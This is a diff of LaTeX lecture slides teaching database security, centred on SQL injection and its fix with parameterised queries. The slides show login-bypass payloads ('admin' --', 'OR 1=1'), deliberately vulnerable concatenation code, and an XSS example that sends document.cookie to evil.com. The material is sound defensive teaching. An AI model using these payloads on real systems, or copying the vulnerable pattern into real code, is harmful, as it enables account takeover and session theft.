@@ -1,195 +1,252 @@
 \section{Database Security}
 
+% ----------------------------------------------------------
 \begin{frame}{Database Security -- Overview}
-  Database security encompasses all policies, controls, and measures implemented to protect
-  database contents, services, and infrastructure from unauthorised access, misuse, corruption,
-  and accidental damage.
+  Database security encompasses all policies and measures to protect database contents,
+  services, and infrastructure from unauthorised access, misuse, and corruption.
 
-  \medskip
-  \textbf{Key threat vectors every database administrator must address:}
-  \begin{itemize}
-    \item \textbf{SQL Injection attacks} -- malicious code injected through user input fields
-    \item \textbf{Excessive user privileges} -- accounts with far more permissions than needed
-    \item \textbf{Weak authentication} -- default passwords, no lockout policy, shared accounts
-    \item \textbf{Unencrypted connections} -- data sent in plaintext over the network
-    \item \textbf{Unencrypted stored data} -- sensitive columns (passwords, PII) stored in plain text
-    \item \textbf{Missing audit logs} -- no record of who accessed or modified what data, when
-    \item \textbf{Unpatched software} -- known CVEs in older DBMS versions exploited by attackers
-  \end{itemize}
+  \begin{block}{Key Threat Vectors}
+    \begin{itemize}
+      \item \textbf{SQL Injection} -- malicious code injected through user input
+      \item \textbf{Excessive privileges} -- accounts with far more permissions than needed
+      \item \textbf{Weak authentication} -- default passwords, no lockout, shared accounts
+      \item \textbf{Unencrypted connections} -- data sent in plaintext over the network
+      \item \textbf{Unencrypted stored data} -- passwords and PII stored in plain text
+      \item \textbf{Missing audit logs} -- no record of who accessed what data and when
+      \item \textbf{Unpatched software} -- known CVEs in older DBMS versions
+      \item \textbf{Cross-Site Scripting (XSS)} -- injecting scripts via stored user content
+    \end{itemize}
+  \end{block}
 
-  \medskip
-  \begin{alertblock}{Focus of this section}
-    We will focus in depth on the most widespread and destructive attack vector:
-    \textbf{SQL Injection} -- and then introduce \textbf{Object-Relational Mapping (ORM)} as
-    one of the most effective architectural defences against it.
+  \begin{alertblock}{Focus of This Section}
+    We focus in depth on \textbf{SQL Injection} -- the most widespread and destructive
+    attack vector -- and its primary defence: \textbf{parameterised queries}.
   \end{alertblock}
 \end{frame}
 
+% ----------------------------------------------------------
 \begin{frame}{SQL Injection -- What Is It?}
   \begin{block}{Definition}
-    \textbf{SQL Injection} is a code injection attack in which an attacker inserts (``injects'')
-    malicious SQL code into a user-facing input field. If the application builds SQL queries by
-    string concatenation, the injected code becomes part of the executed query, causing the DBMS
-    to perform unintended operations.
+    \textbf{SQL Injection} is a code injection attack where an attacker inserts malicious SQL code
+    into a user-facing input field. If the application builds SQL queries by string concatenation,
+    the injected code becomes part of the executed query.
   \end{block}
 
   \begin{itemize}
-    \item First publicly documented in \textbf{1998} by security researcher Jeff Forristal
-          (writing under the alias ``rfp'') in the online magazine \emph{Phrack}.
-    \item Consistently ranked in the \textbf{OWASP Top 10} most critical web application security
-          risks -- it has appeared on this list every year since the list was created.
-    \item Exploits a fundamentally simple mistake: \textbf{user-supplied data is treated as code}
-          rather than as a literal value.
-    \item Consequences range from unauthorised data disclosure (reading all users' records) to
-          data modification or deletion, authentication bypass, and in extreme cases remote code
-          execution on the database server.
+    \item First publicly documented in \textbf{1998} by Jeff Forristal (alias ``rfp'') in \emph{Phrack}.
+    \item Consistently ranked in the \textbf{OWASP Top 10} most critical web security risks.
+    \item Root cause: \textbf{user-supplied data is treated as SQL code} instead of a literal value.
+    \item Consequences: unauthorised data read, data modification/deletion, authentication bypass,
+          and in extreme cases remote code execution on the database server.
   \end{itemize}
 
-  \begin{examples}{Why is it still so common?}
-    SQL Injection is easy to make (one line of careless code) and hard to notice during development
-    -- it only manifests when a malicious input arrives. Many developers are simply unaware.
-  \end{examples}
+  \begin{exampleblock}{Why Is It Still So Common?}
+    SQL injection is easy to make (one line of careless code) and hard to notice during development.
+    It only manifests when malicious input arrives in production.
+  \end{exampleblock}
 \end{frame}
 
-\begin{frame}[fragile]{SQL Injection -- How It Works: Comment Attack}
-  \textbf{Vulnerable login query (built by string concatenation):}
+% ----------------------------------------------------------
+\begin{frame}[fragile]{SQL Injection -- The Vulnerable Code}
+  \textbf{Login form that builds a query by string concatenation:}
 
   \begin{lstlisting}[style=sqlstyle]
-SELECT *
-FROM   users
-WHERE  username = '$username'
-AND    password = '$password'
+-- Application code (pseudo-SQL / PHP-style):
+$query = "SELECT * FROM users
+          WHERE username = '" . $username . "'
+          AND   password = '" . $password . "'";
   \end{lstlisting}
 
   \medskip
-  \textbf{Attack 1 -- Comment injection:}\\
-  Attacker enters: \quad username = \texttt{admin' --} \quad password = \texttt{anything}
-
-  \medskip
-  The application builds and executes the following query:
+  For a normal user, e.g.\ username = \texttt{alice}, password = \texttt{hunter2}, this produces:
 
   \begin{lstlisting}[style=sqlstyle]
-SELECT *
-FROM   users
-WHERE  username = 'admin' -- ' AND password = 'anything'
+SELECT * FROM users
+WHERE  username = 'alice'
+AND    password = 'hunter2'
   \end{lstlisting}
 
-  \medskip
-  The double-dash (\texttt{--}) is a SQL comment delimiter. Everything after it is ignored by the
-  DBMS. The \texttt{AND password = 'anything'} clause is effectively \textbf{commented out}.
-
-  \medskip
-  \begin{alertblock}{Result}
-    The query returns the admin user row \emph{without checking the password at all}.
-    The attacker is now logged in as admin with no knowledge of the real password.
+  \begin{alertblock}{The Problem}
+    The database cannot distinguish between the \emph{structure} of the query and
+    \emph{user-supplied values}. If the user supplies SQL syntax, it becomes part of the query.
   \end{alertblock}
 \end{frame}
 
-\begin{frame}[fragile]{SQL Injection -- OR 1=1 Attack}
-  \textbf{Attack 2 -- Always-true condition:}\\
-  Attacker enters: \quad username = \texttt{' OR 1=1 --} \quad password = \texttt{anything}
+% ----------------------------------------------------------
+\begin{frame}[fragile]{SQL Injection -- Attack 1: Comment Injection}
+  \textbf{Attacker enters:}
+  \begin{itemize}
+    \item Username: \texttt{admin' --}
+    \item Password: \texttt{anything}
+  \end{itemize}
 
   \medskip
-  The application builds and executes:
-
+  \textbf{The application builds and executes:}
   \begin{lstlisting}[style=sqlstyle]
-SELECT *
-FROM   users
-WHERE  username = '' OR 1=1 -- ' AND password = 'anything'
+SELECT * FROM users
+WHERE  username = 'admin' --' AND password = 'anything'
   \end{lstlisting}
 
-  \medskip
-  The injected \texttt{OR 1=1} clause makes the entire \texttt{WHERE} condition evaluate to
-  \texttt{TRUE} for \emph{every row} in the table, because \texttt{1=1} is always true and
-  \texttt{OR} only requires one side to be true.
+  The \texttt{--} is a SQL line comment. Everything after it is \textbf{ignored}.
+  The password check is commented out entirely.
 
   \begin{alertblock}{Result}
-    The query returns \textbf{all rows in the users table}. The attacker is logged in as the
-    first user returned -- which is often the administrator account with the lowest ID or the
-    first entry in the table.
+    The query returns the \texttt{admin} user without ever checking the password.
+    The attacker is now logged in as administrator with \textbf{zero knowledge of the real password}.
+  \end{alertblock}
+\end{frame}
+
+% ----------------------------------------------------------
+\begin{frame}[fragile]{SQL Injection -- Attack 2: OR 1=1}
+  \textbf{Attacker enters:}
+  \begin{itemize}
+    \item Username: \texttt{' OR 1=1 --}
+    \item Password: \texttt{anything}
+  \end{itemize}
+
+  \textbf{Query built by the application:}
+  \begin{lstlisting}[style=sqlstyle]
+SELECT * FROM users
+WHERE  username = '' OR 1=1 --' AND password = 'anything'
+  \end{lstlisting}
+
+  \texttt{OR 1=1} is always \texttt{TRUE}, so the entire \texttt{WHERE} evaluates to \texttt{TRUE}
+  for \emph{every row} in the table.
+
+  \begin{alertblock}{Result}
+    The query returns \textbf{all rows in the users table}. The attacker logs in as the first
+    user returned -- typically the administrator with the lowest ID.
   \end{alertblock}
 
-  \medskip
-  \begin{block}{Other variants}
-    Attackers can also use \texttt{UNION SELECT} to extract data from other tables, use
-    \texttt{DROP TABLE} to destroy data, or use \texttt{INSERT} to create backdoor accounts.
-    The principle is always the same: injected SQL code is executed as part of the query.
+  \begin{block}{Other Variants}
+    Attackers also use \texttt{UNION SELECT} to extract data from other tables, \texttt{DROP TABLE}
+    to destroy data, or \texttt{INSERT} to create backdoor accounts.
   \end{block}
 \end{frame}
 
+% ----------------------------------------------------------
 \begin{frame}{Real-World SQL Injection Cases}
-  \begin{alertblock}{These attacks caused billions of dollars in damages -- and all were preventable}
+  \begin{alertblock}{All of these were preventable with a single code change}
     \begin{itemize}
-      \item \textbf{Heartland Payment Systems (2008)}: Over 100 million credit and debit card
-            numbers were stolen via SQL injection in the company's internal payment processing
-            network. Heartland paid over \$140 million in settlements. At the time, it was the
-            largest data breach in US history.
-      \item \textbf{Sony Pictures (2011)}: More than 1 million user accounts (including plaintext
-            passwords, email addresses, and home addresses) were compromised. The attacker used a
-            single SQL injection vulnerability in a sweepstakes/contest page. Sony's reputation
-            suffered enormously.
-      \item \textbf{TalkTalk (2015)}: Personal and financial data of 157,000 UK customers was
-            exposed via SQL injection on TalkTalk's website. The UK Information Commissioner's
-            Office (ICO) fined TalkTalk \pounds 400,000. A 17-year-old was subsequently convicted
-            for the attack.
+      \item \textbf{Heartland Payment Systems (2008)}: 100 million credit/debit card numbers stolen.
+            Heartland paid over \$140 million in settlements. Largest US data breach at the time.
+      \item \textbf{Sony Pictures (2011)}: 1 million user accounts exposed -- including plaintext
+            passwords, email addresses, and home addresses. Exploited via a single vulnerable
+            sweepstakes page.
+      \item \textbf{TalkTalk (2015)}: 157,000 UK customers' personal and financial data exposed.
+            ICO fined TalkTalk \pounds 400,000. Attacker was a 17-year-old.
     \end{itemize}
   \end{alertblock}
 
-  \medskip
-  In every case, \textbf{a single parameterised query} in place of string concatenation would have
-  made the injection impossible. The fix is cheap; the attack is catastrophically expensive.
-\end{frame}
-
-\begin{frame}[fragile]{Preventing SQL Injection -- Parameterised Queries}
-  The most effective and fundamental defence: \textbf{never construct SQL queries by concatenating
-  user input}. Always use \textbf{parameterised queries} (also called prepared statements).
-
-  \begin{lstlisting}[style=sqlstyle]
--- VULNERABLE: direct string concatenation
-"SELECT * FROM users WHERE name = '" + username + "'"
-
--- SAFE: parameterised query in Python (psycopg2 / MySQLdb)
-cursor.execute(
-    "SELECT * FROM users WHERE name = %s",
-    (username,)
-)
-
--- SAFE: Java PreparedStatement
-PreparedStatement ps = conn.prepareStatement(
-    "SELECT * FROM users WHERE name = ?"
-);
-ps.setString(1, username);
-ResultSet rs = ps.executeQuery();
-  \end{lstlisting}
-
-  \begin{block}{Why parameterised queries are safe}
-    The SQL query structure is \textbf{compiled and sent to the DBMS first}, separately from
-    the user data. The data values are then bound as \emph{literal parameters} -- the DBMS
-    engine treats them as data, never as SQL code. It is \textbf{impossible} for injected SQL
-    syntax in the input to change the structure of the query.
+  \begin{block}{The Key Insight}
+    In every case, a single \textbf{parameterised query} in place of string concatenation would
+    have made the injection \emph{structurally impossible}.
+    The fix costs minutes; the attack costs millions.
   \end{block}
 \end{frame}
 
-\begin{frame}{Preventing SQL Injection -- Configuration and Privileges}
-  Parameterised queries are the primary defence. The following hardening measures provide
-  additional layers of protection:
+% ----------------------------------------------------------
+\begin{frame}[fragile]{Fix: Parameterised Queries -- Python}
+  \textbf{Never construct SQL by concatenating user input.}
+  Use \textbf{parameterised queries} (prepared statements) instead.
 
-  \begin{block}{Database hardening checklist}
+  \begin{lstlisting}[style=sqlstyle, language=Python]
+import mysql.connector
+
+conn = mysql.connector.connect(host='localhost',
+                               user='app', password='...',
+                               database='music_db')
+cursor = conn.cursor()
+
+username = input("Username: ")   # could be malicious!
+password = input("Password: ")
+
+# VULNERABLE -- never do this:
+# cursor.execute("SELECT * FROM users WHERE name='" + username + "'")
+
+# SAFE -- parameterised query:
+cursor.execute(
+    "SELECT * FROM users WHERE username = %s AND password = %s",
+    (username, password)   # values passed separately as a tuple
+)
+user = cursor.fetchone()
+  \end{lstlisting}
+
+  The \texttt{\%s} placeholders are \textbf{never interpreted as SQL}.
+  The driver escapes the values and sends them separately from the query structure.
+\end{frame}
+
+% ----------------------------------------------------------
+\begin{frame}[fragile]{Fix: Parameterised Queries -- Java}
+  \begin{lstlisting}[style=sqlstyle, language=Java]
+// VULNERABLE -- string concatenation:
+String sql = "SELECT * FROM users WHERE username = '"
+             + username + "' AND password = '" + password + "'";
+Statement stmt = conn.createStatement();
+ResultSet rs = stmt.executeQuery(sql);  // NEVER DO THIS
+
+// --------------------------------------------------------
+
+// SAFE -- PreparedStatement (parameterised query):
+String sql = "SELECT * FROM users WHERE username = ? "
+           + "AND password = ?";
+PreparedStatement ps = conn.prepareStatement(sql);
+ps.setString(1, username);   // parameter 1 = ?
+ps.setString(2, password);   // parameter 2 = ?
+ResultSet rs = ps.executeQuery();
+// Any SQL syntax in 'username' or 'password' is treated
+// as literal text -- injection is impossible.
+  \end{lstlisting}
+
+  \begin{block}{How It Works}
+    The SQL structure is \textbf{compiled first}, then parameter values are bound as data.
+    The DBMS engine \emph{never} parses the parameter values as SQL.
+  \end{block}
+\end{frame}
+
+% ----------------------------------------------------------
+\begin{frame}{Fix: XSS -- Cross-Site Scripting (Brief)}
+  \begin{block}{What is XSS?}
+    \textbf{Cross-Site Scripting (XSS)} injects malicious JavaScript into web pages that
+    are then executed by other users' browsers. Stored XSS: the script is saved in the database
+    and displayed to every visitor.
+  \end{block}
+
+  \begin{exampleblock}{Example}
+    A user submits this as their display name: \\
+    \texttt{<script>document.location='https://evil.com/?c='+document.cookie</script>}\\[4pt]
+    If stored unescaped in the DB and rendered verbatim in HTML, every user who views that page
+    sends their session cookie to the attacker.
+  \end{exampleblock}
+
+  \begin{block}{Defences}
     \begin{itemize}
-      \item \textbf{Rename privileged accounts}: do not use default names like \texttt{admin},
-            \texttt{root}, or \texttt{sa} -- attackers specifically target these names.
-      \item \textbf{Principle of Least Privilege}: the database account used by the application
-            should have \emph{only} the permissions it genuinely needs (e.g.\ \texttt{SELECT} and
-            \texttt{INSERT} on specific tables; never \texttt{DROP}, \texttt{CREATE}, or
-            \texttt{GRANT}).
-      \item \textbf{Disable unused default accounts}: DBMSs create several built-in user accounts
-            during installation. Remove or disable any that the application does not need.
-      \item \textbf{Server-side input validation}: validate and sanitise all input on the server
-            (never trust client-side JavaScript validation -- it can be bypassed trivially).
-      \item \textbf{Suppress error messages}: never expose raw SQL error messages to end users;
-            they reveal table names, column names, and database structure to attackers.
-      \item \textbf{Encrypt sensitive data}: passwords \emph{must} be stored as salted hashes
-            (e.g.\ bcrypt, Argon2), never in plain text. Encrypt other sensitive columns at rest.
+      \item \textbf{Output encoding}: escape HTML special characters (\texttt{<}, \texttt{>},
+            \texttt{\&}, \texttt{"}) before rendering user content in HTML.
+      \item \textbf{Content-Security-Policy (CSP)} HTTP header restricts which scripts may execute.
+      \item \textbf{Server-side input validation}: reject input that contains HTML/script tags.
+    \end{itemize}
+  \end{block}
+\end{frame}
+
+% ----------------------------------------------------------
+\begin{frame}{Database Hardening Checklist}
+  Parameterised queries are the primary defence. These measures provide additional protection layers:
+
+  \begin{block}{Configuration and Access Hardening}
+    \begin{itemize}
+      \item \textbf{Rename privileged accounts}: avoid default names \texttt{root}, \texttt{admin},
+            \texttt{sa} -- attackers target these specifically.
+      \item \textbf{Principle of Least Privilege}: application DB account should have only
+            \texttt{SELECT}/\texttt{INSERT} on specific tables; never \texttt{DROP} or \texttt{GRANT}.
+      \item \textbf{Disable unused default accounts} created during DBMS installation.
+      \item \textbf{Server-side input validation}: never trust client-side JavaScript validation;
+            always validate on the server.
+      \item \textbf{Suppress error messages}: never expose raw SQL errors to end users -- they
+            reveal table names, column names, and DB structure.
+      \item \textbf{Encrypt sensitive data}: passwords must be stored as salted hashes
+            (\texttt{bcrypt}, \texttt{Argon2}), never plain text. Encrypt sensitive columns at rest.
+      \item \textbf{Enable TLS} for all database connections.
     \end{itemize}
   \end{block}
 \end{frame}
